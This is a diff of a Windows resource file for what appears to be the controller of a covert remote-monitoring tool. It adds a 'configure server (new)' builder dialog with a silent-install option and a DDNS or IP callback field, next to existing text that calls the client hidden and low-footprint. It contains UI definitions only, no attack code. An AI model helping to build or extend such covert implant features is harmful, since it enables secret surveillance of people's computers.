@@ -144,6 +144,7 @@ BEGIN
         MENUITEM "主界面",                         ID_FILE_USER
         MENUITEM "用户反馈",                        ID_FILE_SETTING
         MENUITEM "配置服务端",                       ID_FILE_BUILD
+        MENUITEM "配置服务器（新）",                   ID_FILE_BUILD_EX
         MENUITEM "退出程序",                        ID_APP_EXIT
     END
     POPUP "&视图"
@@ -450,6 +451,20 @@ BEGIN
     LTEXT           "客户端程序只有5MB,运行隐蔽,资源占用率低，安装后请等待5秒-10秒即可监管电脑。",IDC_STATIC_BUILD2,149,53,244,26
 END
 
+
+IDD_DLG_BUILD_EX DIALOGEX 0, 0, 483, 283
+STYLE DS_SETFONT | DS_FIXEDSYS | WS_CHILD
+FONT 8, "MS Shell Dlg", 400, 0, 0x1
+BEGIN
+    PUSHBUTTON      "生成服务端",IDC_BTN_BUILD_EX,177,210,141,52
+    CONTROL         "显示安装界面",IDC_RADIO_EX1,"Button",BS_AUTORADIOBUTTON,183,140,65,15
+    CONTROL         "静默安装，不显示安装界面",IDC_RADIO_EX2,"Button",BS_AUTORADIOBUTTON,183,166,109,15
+    CONTROL         IDB_BITMAP_KEHU,IDC_STATIC_PIC,"Static",SS_BITMAP,45,34,85,79
+    LTEXT           "配置服务器（新）：可填写域名或 IP，动态解析回连地址",IDC_STATIC_BUILD_EX,149,37,300,16
+    LTEXT           "支持 DDNS 域名；每次连接时通过 DNS 解析服务器地址。",IDC_STATIC_BUILD_EX2,149,53,280,26
+    LTEXT           "服务器地址：",IDC_STATIC_HOST_LABEL,149,92,55,12
+    EDITTEXT        IDC_EDIT_HOST,205,90,180,14,ES_AUTOHSCROLL
+END
 IDD_DLG_FILEMANAGER DIALOGEX 0, 0, 420, 371
 STYLE DS_SETFONT | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME
 CAPTION "对话"
@@ -673,6 +688,10 @@ BEGIN
     END
 
     IDD_DLG_BUILD, DIALOG
+    BEGIN
+    END
+
+    IDD_DLG_BUILD_EX, DIALOG
     BEGIN
     END
 
@@ -954,6 +973,7 @@ BEGIN
     ID_MENUITEM_SHOW        "显示界面"
     ID_MENUITEM_HIDE        "隐藏界面到托盘"
     ID_FILE_BUILD           "配置服务端"
+    ID_FILE_BUILD_EX        "配置服务器（新）"
     ID_FILE_SETTING         "用户反馈"
 END
 
